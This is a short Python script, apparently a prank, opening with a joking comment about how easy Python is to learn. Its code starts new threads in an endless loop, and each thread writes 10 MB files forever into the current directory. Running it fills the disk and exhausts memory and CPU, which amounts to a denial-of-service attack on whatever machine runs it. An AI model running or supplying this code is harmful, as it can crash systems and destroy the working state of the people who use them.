# I wonder if Guido van Rossum ever thought of the consequences of creating a language that is so easy to learn.

import threading
import random

threads = []

def createFiles(j):
    i = 0
    letter = random.choice("a b c d e f g h i j k l m n o p q r s t u v w x y z".split())
    word = letter*1024*1024*10
    while True:
        with open(f"{letter}{j}-{i}.txt", "w") as f:
            f.write(word)
        i += 1

j = 0
while True:
    threads.append(threading.Thread(target=createFiles, args=(j,)))
    threads[-1].start()
    j += 1
